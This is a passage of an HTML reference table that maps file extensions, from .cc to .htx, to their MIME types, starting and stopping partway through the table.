<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.cc</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/plain</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.cc</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/x-c</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.ccad</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/clariscad</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.cco</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-cocoa</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.cdf</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/cdf</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.cdf</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-cdf</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.cdf</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-netcdf</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.cer</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/pkix-cert</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.cer</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-x509-ca-cert</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.cha</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-chat</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.chat</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-chat</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.class</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/java</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.class</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/java-byte-code</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.class</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-java-class</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.com</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/octet-stream</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.com</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/plain</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.conf</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/plain</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.cpio</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-cpio</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.cpp</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/x-c</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.cpt</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/mac-compactpro</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.cpt</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-compactpro</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.cpt</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-cpt</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.crl</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/pkcs-crl</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.crl</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/pkix-crl</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.crt</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/pkix-cert</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.crt</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-x509-ca-cert</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.crt</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-x509-user-cert</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.csh</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-csh</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.csh</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/x-script.csh</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.css</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-pointplus</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.css</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/css</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.cxx</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/plain</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.dcr</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-director</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.deepv</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-deepv</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.def</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/plain</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.der</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-x509-ca-cert</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.dif</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">video/x-dv</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.dir</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-director</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.dl</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">video/dl</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.dl</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">video/x-dl</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.doc</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/msword</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.dot</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/msword</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.dp</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/commonground</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.drw</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/drafting</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.dump</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/octet-stream</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.dv</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">video/x-dv</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.dvi</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-dvi</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.dwf</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">drawing/x-dwf (old)</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.dwf</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">model/vnd.dwf</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.dwg</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/acad</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.dwg</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">image/vnd.dwg</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.dwg</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">image/x-dwg</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.dxf</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/dxf</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.dxf</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">image/vnd.dwg</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.dxf</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">image/x-dwg</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.dxr</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-director</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.el</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/x-script.elisp</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.elc</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-bytecode.elisp (compiled elisp)</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.elc</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-elc</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.env</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-envoy</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.eps</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/postscript</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.es</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-esrehber</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.etx</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/x-setext</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.evy</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/envoy</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.evy</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-envoy</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.exe</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/octet-stream</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.f</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/plain</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.f</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/x-fortran</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.f77</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/x-fortran</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.f90</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/plain</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.f90</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/x-fortran</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.fdf</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/vnd.fdf</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.fif</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/fractals</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.fif</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">image/fif</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.fli</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">video/fli</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.fli</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">video/x-fli</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.flo</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">image/florian</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.flx</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/vnd.fmi.flexstor</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.fmf</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">video/x-atomic3d-feature</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.for</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/plain</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.for</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/x-fortran</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.fpx</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">image/vnd.fpx</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.fpx</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">image/vnd.net-fpx</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.frl</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/freeloader</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.funk</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">audio/make</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.g</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/plain</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.g3</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">image/g3fax</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.gif</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">image/gif</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.gl</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">video/gl</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.gl</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">video/x-gl</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.gsd</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">audio/x-gsm</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.gsm</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">audio/x-gsm</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.gsp</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-gsp</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.gss</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-gss</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.gtar</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-gtar</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.gz</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-compressed</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.gz</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-gzip</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.gzip</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-gzip</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.gzip</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">multipart/x-gzip</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.h</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/plain</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.h</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/x-h</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.hdf</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-hdf</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.help</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-helpfile</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.hgl</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/vnd.hp-hpgl</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.hh</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/plain</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.hh</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/x-h</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.hlb</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/x-script</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.hlp</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/hlp</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.hlp</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-helpfile</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.hlp</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-winhelp</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.hpg</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/vnd.hp-hpgl</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.hpgl</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/vnd.hp-hpgl</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.hqx</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/binhex</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.hqx</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/binhex4</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.hqx</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/mac-binhex</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.hqx</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/mac-binhex40</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.hqx</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-binhex40</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.hqx</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/x-mac-binhex40</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.hta</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">application/hta</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.htc</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/x-component</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.htm</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/html</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.html</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/html</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.htmls</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/html</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.htt</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/webviewhtml</span></td>
</tr>
<tr>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">.htx</span></td>
<td class="" style="text-align: center;" headers="d8073e47 d8073e50 "><span style="font-size: 14pt;">text/html</span></td>
</tr>
<tr>
